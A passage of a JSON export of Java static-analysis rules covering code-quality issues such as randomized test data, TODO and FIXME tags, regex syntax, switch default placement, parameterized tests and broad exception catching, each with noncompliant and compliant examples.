            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5977",
            "repo": "java",
            "name": "Tests should use fixed data instead of randomized data",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Tests should always:</p>\n<ul>\n  <li> Make sure that production code behaves as expected, including edge cases. </li>\n  <li> Be easy to debug, i.e. understandable and reproducible. </li>\n</ul>\n<p>Using random values in tests will not necessarily check edge cases, and it will make test logs a lot harder to read. It is better to use easily\nreadable hardcoded values. If this makes your code bigger you can use helper functions.</p>\n<p>There is one valid use case for random data in tests: when testing every value would make tests impractically slow. In this case the best you can\ndo is use random to test every value on the long run. You should however make sure that random values are logged so that you can reproduce failures.\nSome libraries exist to make all this easier. You can for example use property-based testing libraries such as <a\nhref=\"https://github.com/jlink/jqwik\">jqwik</a>.</p>\n<p>This rule raises an issue when <code>new Random()</code> or <code>UUID.randomUUID()</code> are called in test code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint userAge = new Random().nextInt(42);  // Noncompliant\nUUID userID = UUID.randomUUID(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint userAge = 31;\nUUID userID = UUID.fromString(\"00000000-000-0000-0000-000000000001\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-fixed-data-instead-of-randomized-data\">Modern Best Practices for\n  Testing in Java - Philipp Hauer</a> </li>\n  <li> <a href=\"https://jqwik.net/\">Jqwik test engine</a> </li>\n</ul>",
            "mdDesc": "<p>Tests should always:</p>\n<ul>\n  <li> Make sure that production code behaves as expected, including edge cases. </li>\n  <li> Be easy to debug, i.e. understandable and reproducible. </li>\n</ul>\n<p>Using random values in tests will not necessarily check edge cases, and it will make test logs a lot harder to read. It is better to use easily\nreadable hardcoded values. If this makes your code bigger you can use helper functions.</p>\n<p>There is one valid use case for random data in tests: when testing every value would make tests impractically slow. In this case the best you can\ndo is use random to test every value on the long run. You should however make sure that random values are logged so that you can reproduce failures.\nSome libraries exist to make all this easier. You can for example use property-based testing libraries such as <a\nhref=\"https://github.com/jlink/jqwik\">jqwik</a>.</p>\n<p>This rule raises an issue when <code>new Random()</code> or <code>UUID.randomUUID()</code> are called in test code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint userAge = new Random().nextInt(42);  // Noncompliant\nUUID userID = UUID.randomUUID(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint userAge = 31;\nUUID userID = UUID.fromString(\"00000000-000-0000-0000-000000000001\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-fixed-data-instead-of-randomized-data\">Modern Best Practices for\n  Testing in Java - Philipp Hauer</a> </li>\n  <li> <a href=\"https://jqwik.net/\">Jqwik test engine</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing",
                "design",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1135",
            "repo": "java",
            "name": "Track uses of \"TODO\" tags",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething() {\n  // TODO\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/546.html\">MITRE, CWE-546</a> - Suspicious Comment </li>\n</ul>",
            "mdDesc": "<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething() {\n  // TODO\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/546.html\">MITRE, CWE-546</a> - Suspicious Comment </li>\n</ul>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5856",
            "repo": "java",
            "name": "Regular expressions should be syntactically valid",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Regular expressions have their own syntax that is understood by regular expression engines. Those engines will throw an exception at runtime if\nthey are given a regular expression that does not conform to that syntax.</p>\n<p>To avoid syntax errors, special characters should be escaped with backslashes when they are intended to be matched literally and references to\ncapturing groups should use the correctly spelled name or number of the group.</p>\n<p>To match a literal string, rather than a regular expression, either all special characters should be escaped or the <code>Pattern.LITERAL</code>\nflag or methods that don't use regular expressions should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"([\");\nstr.matches(\"([\");\nstr.replaceAll(\"([\", \"{\");\nstr.matches(\"(\\\\w+-(\\\\d+)\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\(\\\\[\");\nPattern.compile(\"([\", Pattern.LITERAL);\nstr.equals(\"([\");\nstr.replace(\"([\", \"{\");\nstr.matches(\"(\\\\w+)-(\\\\d+)\");\n</pre>",
            "mdDesc": "<p>Regular expressions have their own syntax that is understood by regular expression engines. Those engines will throw an exception at runtime if\nthey are given a regular expression that does not conform to that syntax.</p>\n<p>To avoid syntax errors, special characters should be escaped with backslashes when they are intended to be matched literally and references to\ncapturing groups should use the correctly spelled name or number of the group.</p>\n<p>To match a literal string, rather than a regular expression, either all special characters should be escaped or the <code>Pattern.LITERAL</code>\nflag or methods that don't use regular expressions should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"([\");\nstr.matches(\"([\");\nstr.replaceAll(\"([\", \"{\");\nstr.matches(\"(\\\\w+-(\\\\d+)\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"\\\\(\\\\[\");\nPattern.compile(\"([\", Pattern.LITERAL);\nstr.equals(\"([\");\nstr.replace(\"([\", \"{\");\nstr.matches(\"(\\\\w+)-(\\\\d+)\");\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4524",
            "repo": "java",
            "name": "\"default\" clauses should be last",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were\nproperly considered.</p>\n<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the\n<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the\nlast one of the <code>switch</code>'s cases.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  default: // default clause should be the last one\n    error();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>",
            "mdDesc": "<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were\nproperly considered.</p>\n<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the\n<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the\nlast one of the <code>switch</code>'s cases.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  default: // default clause should be the last one\n    error();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5855",
            "repo": "java",
            "name": "Regex alternatives should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If an alternative in a regular expression only matches things that are already matched by another alternative, that alternative is redundant and\nserves no purpose.</p>\n<p>In the best case this means that the offending subpattern is merely redundant and should be removed. In the worst case it's a sign that this regex\ndoes not match what it was intended to match and should be reworked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"[ab]|a\"   // The \"|a\" is redundant because \"[ab]\" already matches \"a\"\n\".*|a\"     // .* matches everything, so any other alternative is redundant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"[ab]\"\n\".*\"\n</pre>",
            "mdDesc": "<p>If an alternative in a regular expression only matches things that are already matched by another alternative, that alternative is redundant and\nserves no purpose.</p>\n<p>In the best case this means that the offending subpattern is merely redundant and should be removed. In the worst case it's a sign that this regex\ndoes not match what it was intended to match and should be reworked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"[ab]|a\"   // The \"|a\" is redundant because \"[ab]\" already matches \"a\"\n\".*|a\"     // .* matches everything, so any other alternative is redundant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"[ab]\"\n\".*\"\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5976",
            "repo": "java",
            "name": "Similar tests should be grouped in a single Parameterized test",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When multiple tests differ only by a few hardcoded values they should be refactored as a single \"parameterized\" test. This reduces the chances of\nadding a bug and makes them more readable. Parameterized tests exist in most test frameworks (JUnit, TestNG, etc...).</p>\n<p>The right balance needs of course to be found. There is no point in factorizing test methods when the parameterized version is a lot more complex\nthan initial tests.</p>\n<p>This rule raises an issue when at least 3 tests could be refactored as one parameterized test with less than 4 parameters. Only test methods which\nhave at least one duplicated statement are considered.</p>\n<h2>Noncompliant Code Example</h2>\n<p>with JUnit 5</p>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.api.Test;\n\npublic class AppTest\n{\n    @Test\n    void test_not_null1() {  // Noncompliant. The 3 following tests differ only by one hardcoded number.\n      setupTax();\n      assertNotNull(getTax(1));\n    }\n\n    @Test\n    void test_not_null2() {\n      setupTax();\n      assertNotNull(getTax(2));\n    }\n\n    @Test\n    void test_not_nul3l() {\n      setupTax();\n      assertNotNull(getTax(3));\n    }\n\n    @Test\n    void testLevel1() {  // Noncompliant. The 3 following tests differ only by a few hardcoded numbers.\n        setLevel(1);\n        runGame();\n        assertEquals(playerHealth(), 100);\n    }\n\n    @Test\n    void testLevel2() {  // Similar test\n        setLevel(2);\n        runGame();\n        assertEquals(playerHealth(), 200);\n    }\n\n    @Test\n    void testLevel3() {  // Similar test\n        setLevel(3);\n        runGame();\n        assertEquals(playerHealth(), 300);\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.params.ParameterizedTest;\nimport org.junit.jupiter.params.provider.CsvSource;\n\npublic class AppTest\n{\n\n   @ParameterizedTest\n   @ValueSource(ints = {1, 2, 3})\n   void test_not_null(int arg) {\n     setupTax();\n     assertNotNull(getTax(arg));\n   }\n\n    @ParameterizedTest\n    @CsvSource({\n        \"1, 100\",\n        \"2, 200\",\n        \"3, 300\",\n    })\n    void testLevels(int level, int health) {\n        setLevel(level);\n        runGame();\n        assertEquals(playerHealth(), health);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-parameterized-tests\">Modern Best Practices for Testing in Java -\n  Philipp Hauer</a> </li>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests\">JUnit 5 documentation - Parameterized tests</a>\n  </li>\n  <li> <a href=\"https://www.testwithspring.com/lesson/writing-parameterized-tests-with-junit-4/\">Writing Parameterized Tests With JUnit 4</a> </li>\n  <li> <a href=\"https://testng.org/doc/documentation-main.html#parameters\">TestNG documentation - Parameters</a> </li>\n</ul>",
            "mdDesc": "<p>When multiple tests differ only by a few hardcoded values they should be refactored as a single \"parameterized\" test. This reduces the chances of\nadding a bug and makes them more readable. Parameterized tests exist in most test frameworks (JUnit, TestNG, etc...).</p>\n<p>The right balance needs of course to be found. There is no point in factorizing test methods when the parameterized version is a lot more complex\nthan initial tests.</p>\n<p>This rule raises an issue when at least 3 tests could be refactored as one parameterized test with less than 4 parameters. Only test methods which\nhave at least one duplicated statement are considered.</p>\n<h2>Noncompliant Code Example</h2>\n<p>with JUnit 5</p>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.api.Test;\n\npublic class AppTest\n{\n    @Test\n    void test_not_null1() {  // Noncompliant. The 3 following tests differ only by one hardcoded number.\n      setupTax();\n      assertNotNull(getTax(1));\n    }\n\n    @Test\n    void test_not_null2() {\n      setupTax();\n      assertNotNull(getTax(2));\n    }\n\n    @Test\n    void test_not_nul3l() {\n      setupTax();\n      assertNotNull(getTax(3));\n    }\n\n    @Test\n    void testLevel1() {  // Noncompliant. The 3 following tests differ only by a few hardcoded numbers.\n        setLevel(1);\n        runGame();\n        assertEquals(playerHealth(), 100);\n    }\n\n    @Test\n    void testLevel2() {  // Similar test\n        setLevel(2);\n        runGame();\n        assertEquals(playerHealth(), 200);\n    }\n\n    @Test\n    void testLevel3() {  // Similar test\n        setLevel(3);\n        runGame();\n        assertEquals(playerHealth(), 300);\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport static org.junit.jupiter.api.Assertions.assertEquals;\n\nimport org.junit.jupiter.params.ParameterizedTest;\nimport org.junit.jupiter.params.provider.CsvSource;\n\npublic class AppTest\n{\n\n   @ParameterizedTest\n   @ValueSource(ints = {1, 2, 3})\n   void test_not_null(int arg) {\n     setupTax();\n     assertNotNull(getTax(arg));\n   }\n\n    @ParameterizedTest\n    @CsvSource({\n        \"1, 100\",\n        \"2, 200\",\n        \"3, 300\",\n    })\n    void testLevels(int level, int health) {\n        setLevel(level);\n        runGame();\n        assertEquals(playerHealth(), health);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://phauer.com/2019/modern-best-practices-testing-java/#use-parameterized-tests\">Modern Best Practices for Testing in Java -\n  Philipp Hauer</a> </li>\n  <li> <a href=\"https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests\">JUnit 5 documentation - Parameterized tests</a>\n  </li>\n  <li> <a href=\"https://www.testwithspring.com/lesson/writing-parameterized-tests-with-junit-4/\">Writing Parameterized Tests With JUnit 4</a> </li>\n  <li> <a href=\"https://testng.org/doc/documentation-main.html#parameters\">TestNG documentation - Parameters</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "clumsy",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1133",
            "repo": "java",
            "name": "Deprecated code should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo {\n  /**\n   * @deprecated\n   */\n  public void foo() {    // Noncompliant\n  }\n\n  @Deprecated            // Noncompliant\n  public void bar() {\n  }\n\n  public void baz() {    // Compliant\n  }\n}\n</pre>",
            "mdDesc": "<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo {\n  /**\n   * @deprecated\n   */\n  public void foo() {    // Noncompliant\n  }\n\n  @Deprecated            // Noncompliant\n  public void bar() {\n  }\n\n  public void baz() {    // Compliant\n  }\n}\n</pre>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1134",
            "repo": "java",
            "name": "Track uses of \"FIXME\" tags",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint divide(int numerator, int denominator) {\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/546.html\">MITRE, CWE-546</a> - Suspicious Comment </li>\n</ul>",
            "mdDesc": "<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint divide(int numerator, int denominator) {\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/546.html\">MITRE, CWE-546</a> - Suspicious Comment </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2221",
            "repo": "java",
            "name": "\"Exception\" should not be caught when not required by called methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,\nboth checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime\nexceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed\nin the <code>catch</code> clause.</p>\n<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException\n} catch (Exception e) { // Noncompliant\n  // log exception ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {\n  // log exception ...\n}\n</pre>\n<p>or if runtime exceptions should not be caught:</p>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {\n  // log exception ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/396.html\">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>\n</ul>",
            "mdDesc": "<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,\nboth checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime\nexceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed\nin the <code>catch</code> clause.</p>\n<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException\n} catch (Exception e) { // Noncompliant\n  // log exception ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {\n  // log exception ...\n}\n</pre>\n<p>or if runtime exceptions should not be caught:</p>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {\n  // log exception ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/396.html\">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5850",
            "repo": "java",
            "name": "Alternatives in regular expressions should be grouped when used with anchors",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In regular expressions, anchors (<code>^</code>, <code>$</code>, <code>\\A</code>, <code>\\Z</code> and <code>\\z</code>) have higher precedence than\nthe <code>|</code> operator. So in a regular expression like <code>^alt1|alt2|alt3$</code>, <code>alt1</code> would be anchored to the beginning,\n<code>alt3</code> to the end and <code>alt2</code> wouldn't be anchored at all. Usually the intended behavior is that all alternatives are anchored at\nboth ends. To achieve this, a non-capturing group should be used around the alternatives.</p>\n<p>In cases where it is intended that the anchors only apply to one alternative each, adding (non-capturing) groups around the anchors and the parts\nthat they apply to will make it explicit which parts are anchored and avoid readers misunderstanding the precedence or changing it because they\nmistakenly assume the precedence was not intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n^a|b|c$\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n^(?:a|b|c)$\n</pre>\n<p>or</p>\n<pre>\n^a$|^b$|^c$\n</pre>\n<p>or, if you do want the anchors to only apply to <code>a</code> and <code>c</code> respectively:</p>\n<pre>\n(?:^a)|b|(?:c$)\n</pre>",
            "mdDesc": "<p>In regular expressions, anchors (<code>^</code>, <code>$</code>, <code>\\A</code>, <code>\\Z</code> and <code>\\z</code>) have higher precedence than\nthe <code>|</code> operator. So in a regular expression like <code>^alt1|alt2|alt3$</code>, <code>alt1</code> would be anchored to the beginning,\n<code>alt3</code> to the end and <code>alt2</code> wouldn't be anchored at all. Usually the intended behavior is that all alternatives are anchored at\nboth ends. To achieve this, a non-capturing group should be used around the alternatives.</p>\n<p>In cases where it is intended that the anchors only apply to one alternative each, adding (non-capturing) groups around the anchors and the parts\nthat they apply to will make it explicit which parts are anchored and avoid readers misunderstanding the precedence or changing it because they\nmistakenly assume the precedence was not intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n^a|b|c$\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n^(?:a|b|c)$\n</pre>\n<p>or</p>\n<pre>\n^a$|^b$|^c$\n</pre>\n<p>or, if you do want the anchors to only apply to <code>a</code> and <code>c</code> respectively:</p>\n<pre>\n(?:^a)|b|(?:c$)\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1132",
            "repo": "java",
            "name": "Strings literals should be placed on the left side when checking for equality",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>\n<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myString = null;\n\nSystem.out.println(\"Equal? \" + myString.equals(\"foo\"));                        // Noncompliant; will raise a NPE\nSystem.out.println(\"Equal? \" + (myString != null &amp;&amp; myString.equals(\"foo\")));  // Noncompliant; null check could be removed\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSystem.out.println(\"Equal?\" + \"foo\".equals(myString));                         // properly deals with the null case\n</pre>",
            "mdDesc": "<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>\n<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myString = null;\n\nSystem.out.println(\"Equal? \" + myString.equals(\"foo\"));                        // Noncompliant; will raise a NPE\nSystem.out.println(\"Equal? \" + (myString != null &amp;&amp; myString.equals(\"foo\")));  // Noncompliant; null check could be removed\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSystem.out.println(\"Equal?\" + \"foo\".equals(myString));                         // properly deals with the null case\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5970",
            "repo": "java",
